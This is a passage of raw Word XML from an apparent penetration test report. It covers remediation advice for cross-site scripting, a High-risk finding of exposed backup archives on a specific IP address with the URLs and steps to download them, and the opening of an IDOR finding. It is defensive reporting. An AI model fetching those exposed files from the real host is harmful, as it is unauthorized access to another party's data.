            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="00A81704" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="001C40ED" w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="18"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Filter input on arrival.</w:t>
            </w:r>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t> At the point where user input is received, filter as strictly as possible based on what is expected or valid input.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="18"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Encode data on output.</w:t>
            </w:r>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="18"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Use appropriate response headers.</w:t>
            </w:r>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t> To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="001C40ED" w:rsidRPr="001C40ED" w:rsidRDefault="001C40ED" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="18"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Content Security Policy.</w:t>
            </w:r>
            <w:r w:rsidRPr="001C40ED">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t> As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="001C40ED">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00494827" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009A0937">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Backup/Default and Test Files found with Sensitive Information</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00E96BAE" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00494827" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Back up/default/test files were left accessible on the application. These may allow access to critical functionalities, contain sensitive information or have vulnerabilities that can be exploited on the application.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00494827" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00494827" w:rsidRPr="00494827" w:rsidRDefault="00494827" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.tgz</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00494827" w:rsidRPr="00494827" w:rsidRDefault="00494827" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.zip</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00494827" w:rsidRDefault="00494827" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.tar.gz</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00494827" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="20"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL and Download the Mantis backup file.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00494827" w:rsidRPr="00802CE3" w:rsidRDefault="00494827" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="20"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Extract the archive and Navigate to the codebase of the Mantis application.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00494827" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="431C48BC" wp14:editId="60337954">
                  <wp:extent cx="7245350" cy="2895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245350" cy="2895600"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="00494827" w:rsidRPr="009A0937">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Backup/Default and Test Files found with Sensitive Information</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00494827">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00494827" w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Remove all back up/unwanted files from the application</w:t>
            </w:r>
            <w:r w:rsidR="00E96BAE">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>/application server</w:t>
            </w:r>
            <w:r w:rsidR="00494827" w:rsidRPr="00494827">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00FB304F" w:rsidP="00FB304F">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Insecure Direct Object Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00E96BAE" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
